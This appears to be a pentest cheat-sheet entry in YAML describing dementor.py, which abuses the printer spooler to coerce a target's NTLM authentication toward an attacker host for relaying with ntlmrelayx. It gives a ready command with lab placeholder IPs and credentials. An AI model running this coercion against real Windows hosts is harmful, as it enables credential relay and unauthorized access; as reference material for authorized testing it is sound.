---
description: |
  dementor.py interacts with the printer spooler on a host to trigger an authentication from the target IP to an attacker controlled host (usually an SMB or HTTP server). This captured authentication can then be relayed to authenticated to other hosts. See more in ntlmrelayx.py.

  Command Reference:

  	Target IP: 10.10.10.1

  	Attacker IP: 10.10.10.2

  	Domain: test.local

  	Username: john

  	Password: password123

items:
  Password:
    - code: |
        python3 dementor.py -u john -p password123 -d test.local 10.10.10.2 10.10.10.1
  Username:
    - code: |
        empty
filters:
  RPC:
    - code: |
        empty
---
